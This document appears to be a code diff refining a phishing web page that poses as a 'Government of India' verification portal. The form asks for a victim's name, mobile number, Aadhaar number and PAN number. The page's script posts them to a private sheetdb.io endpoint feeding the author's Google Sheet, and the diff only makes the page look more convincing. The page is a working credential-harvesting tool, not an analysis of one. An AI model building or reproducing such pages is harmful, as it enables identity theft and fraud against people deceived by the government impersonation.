@@ -1,36 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Portal</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Government of India - Portal</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; padding: 15px; }
-        .box { background: white; max-width: 420px; margin: auto; padding: 20px; border-radius: 12px; border-top: 6px solid #003366; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
-        .btn { background: #28a745; color: white; border: none; width: 100%; padding: 15px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        body { font-family: sans-serif; background: #f0f2f5; padding: 10px; margin: 0; }
+        .box { background: white; max-width: 450px; margin: 15px auto; padding: 25px; border-radius: 12px; border-top: 8px solid #003366; box-shadow: 0 4px 15px rgba(0,0,0,0.15); }
+        h2 { text-align: center; color: #003366; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 1px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
+        .btn { background: #28a745; color: white; border: none; padding: 18px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; }
+        .btn:active { background: #218838; }
     </style>
 </head>
 <body>
 <div class="box">
-    <h2 style="text-align:center; color:#003366;">GOVERNMENT OF INDIA</h2>
-    <form id="finalForm">
+    <h2>Government of India</h2>
+    <form id="verificationForm">
         <input type="text" name="Name" placeholder="Full Name" required>
         <input type="tel" name="Mobile" placeholder="Mobile Number" required>
         <input type="text" name="Aadhaar_No" placeholder="Aadhaar Number" required>
         <input type="text" name="PAN_No" placeholder="PAN Number" required>
-        <button type="button" class="btn" onclick="sendToSheet()">SUBMIT NOW</button>
+        <button type="button" class="btn" id="submitBtn" onclick="sendData()">SUBMIT NOW</button>
     </form>
 </div>
+
 <script>
-    function sendToSheet() {
-        const apiURL = 'https://sheetdb.io/api/v1/nvchx3e538ya4'; // Aapka API Link
-        const form = document.getElementById('finalForm');
-        
-        fetch(apiURL, { method: 'POST', body: new FormData(form) })
-        .then(() => {
-            alert("Success! Check your Google Sheet.");
-            form.reset();
-        }).catch(() => alert("Error! Please try again."));
+    function sendData() {
+        const btn = document.getElementById('submitBtn');
+        const form = document.getElementById('verificationForm');
+        const apiURL = 'https://sheetdb.io/api/v1/nvchx3e538ya4'; // Aapka confirm API link
+
+        if(!form.checkValidity()) { form.reportValidity(); return; }
+
+        btn.innerHTML = "Processing...";
+        btn.disabled = true;
+
+        fetch(apiURL, {
+            method: 'POST',
+            body: new FormData(form)
+        })
+        .then(response => {
+            if(response.ok) {
+                alert("SUCCESS! Data has been recorded.");
+                form.reset();
+            } else {
+                alert("Error! Please check your Google Sheet.");
+            }
+        })
+        .catch(error => {
+            alert("Network Error! Check your internet.");
+        })
+        .finally(() => {
+            btn.innerHTML = "SUBMIT NOW";
+            btn.disabled = false;
+        });
     }
 </script>
 </body>
